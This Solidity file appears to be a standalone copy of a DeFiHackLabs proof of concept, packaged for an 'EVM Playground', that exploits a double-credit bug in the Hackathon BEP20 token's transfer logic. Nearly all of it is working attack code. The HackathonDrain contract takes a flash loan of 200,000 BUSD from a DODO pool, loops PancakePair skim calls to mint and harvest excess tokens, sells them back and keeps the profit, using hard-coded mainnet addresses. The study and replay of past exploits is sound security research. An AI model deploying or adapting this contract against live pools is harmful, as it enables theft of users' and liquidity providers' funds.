// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-Hackathon).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `Exploit is Test`
// harness — the DODO DPP flash-loan callback `DPPFlashLoanCall` lives on the
// test contract itself (assetTo = address(this)), so there is no standalone
// exploit contract to deploy. This file is a faithful, self-contained copy of
// that inline attack (testExploit body + DPPFlashLoanCall callback + swap
// helper + minimal inline interfaces — no imports so it compiles anywhere),
// compiled inside the registry forge project. Logic and constants are copied
// verbatim from test/Hackathon_exp.sol.
//
// Root cause: the Hackathon BEP20 token's _transfer() uses TWO INDEPENDENT
// `if` statements instead of `if/else` to decide the BUY vs SELL branch:
//   if (pair[sender])    { _balances[recipient] = _balances[recipient].add(amount); }
//   if (pair[recipient]) { _balances[recipient] = _balances[recipient].add(amount); }
// When sender == recipient == the pair (both booleans true), BOTH branches
// run and the pair's balance is credited TWICE for a single debit — minting
// ~1x `amount` of Hackathon out of thin air into the pair's own balance.
// PancakePair.skim(to) does `token.transfer(to, balanceOf(pair) - reserve)`,
// so calling skim(pair) is a pair-to-pair self-transfer that hits the bug and
// inflates the pair's Hackathon balance; skim(self) then harvests the excess
// back to the attacker, who sells it back into the pool for BUSD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract HackathonDrain {
    IPancakePair constant Pair = IPancakePair(0xd46f4a4B57D8EC355fe83F9AE75d4cC04DE371ED);
    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant Hackathon = IERC20(0x11cee747Faaf0C0801075253ac28aB503C888888);

    // step 1: flash-borrow 200,000 BUSD (0 fee) from the DODO DPP pool.
    // The callback below runs the double-credit skim() cycle 10x, then repays.
    function run() external {
        DPP.flashLoan(0, 200_000 ether, address(this), new bytes(1));
    }

    // DODO DPP flash-loan callback. Each of the 10 iterations: buy Hackathon
    // with BUSD, send the Hackathon to the pair, then skim(pair) 10x to
    // inflate the pair's own balance via the double-credit bug and skim(self)
    // 10x to harvest the inflated excess back to this contract, then sell the
    // harvested Hackathon back into the pool for BUSD.
    function DPPFlashLoanCall(address, /* sender */ uint256, /* baseAmount */ uint256 quoteAmount, bytes calldata /* data */ ) external {
        BUSD.approve(address(Pair), type(uint256).max);
        BUSD.approve(address(Router), type(uint256).max);
        uint256 j = 0;
        while (j < 10) {
            uint256 i = 0;
            swap_token_to_token(address(BUSD), address(Hackathon), 200_000 * 1e18);
            Hackathon.transfer(address(Pair), Hackathon.balanceOf(address(this)));
            while (i < 10) {
                Pair.skim(address(Pair));
                Pair.skim(address(this));
                i++;
            }
            swap_token_to_token(address(Hackathon), address(BUSD), Hackathon.balanceOf(address(this)));
            j++;
        }
        // repay the 200,000 BUSD flash loan; the remainder is kept as profit
        // (this contract IS the attacker / profit receiver — see profitReceiver: "exploit").
        BUSD.transfer(msg.sender, quoteAmount);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
